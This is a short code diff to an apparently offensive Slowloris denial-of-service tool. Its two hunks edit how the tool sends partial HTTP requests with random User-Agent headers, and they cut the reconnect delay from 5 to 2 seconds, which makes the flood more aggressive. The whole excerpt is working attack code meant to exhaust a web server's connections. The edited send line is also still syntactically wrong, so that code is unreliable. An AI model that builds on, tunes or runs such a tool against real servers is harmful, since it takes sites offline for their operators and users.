@@ -99,7 +99,7 @@ def SLOWLORIS(threads, host, port, mode):
         except socket.error:
             print("[-] Server is unresponsive maybe down?")
 
-        sock.send("GET /? DO_YOU_LOVE_CITRUS?_POISON_SEC HTTP/1.1\r\n").encode("utf-8"))
+        sock.send("GET /? DO_YOU_LOVE_CITRUS?_POISON_SEC HTTP/1.1\r\n").encode("utf-8")
         sock.send("User-Agent: {}\r\n".format(random.choice(headers_useragents)).encode("utf-8"))
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 
@@ -146,7 +146,7 @@ def SLOWLORIS(threads, host, port, mode):
                         print(f"[-] {e}")
                         break
                 print("[-] Re-connecting to the server")
-                time.sleep(5)
+                time.sleep(2)
 
             except (KeyboardInterrupt, SystemExit):
                 print("\n[-] Citrus collapsed. Cannot resolved the problem")
